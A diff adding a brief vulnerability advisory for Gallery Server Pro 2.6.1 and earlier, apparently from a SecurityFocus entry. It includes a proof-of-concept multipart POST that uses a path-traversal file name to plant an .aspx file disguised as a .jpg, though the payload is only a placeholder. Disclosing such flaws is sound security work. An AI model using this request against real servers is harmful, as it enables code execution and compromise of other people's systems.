@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/59831/info
+
+Gallery Server Pro is prone to a vulnerability that lets attackers upload arbitrary files.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+Gallery Server Pro 2.6.1 and prior are vulnerable. 
+
+*********************************************************************
+POST /gallery/gs/handler/upload.ashx?aid=2 HTTP/1.1
+Host: <vulnerablesite>
+Referer:
+http://www.example.com/gallery/default.aspx?g=task_addobjects&aid=2
+Content-Length: 73459
+Content-Type: multipart/form-data;
+boundary=---------------------------41184676334
+Cookie: <VALID COOKIE DATA>
+Pragma: no-cache
+Cache-Control: no-cache
+
+-----------------------------41184676334
+Content-Disposition: form-data; name="name"
+
+..\..\gs\mediaobjects\Samples\malicious.aspx
+-----------------------------41184676334
+Content-Disposition: form-data; name="file"; filename="malicious.jpg"
+Content-Type: application/octet-stream
+
+Malicious code here.
+
+-----------------------------41184676334--
+*********************************************************************
+
+The uploaded file will then be available on the affected server at:
+http://www.example.com/gallery/gs/mediaobjects/Samples/malicious.aspx
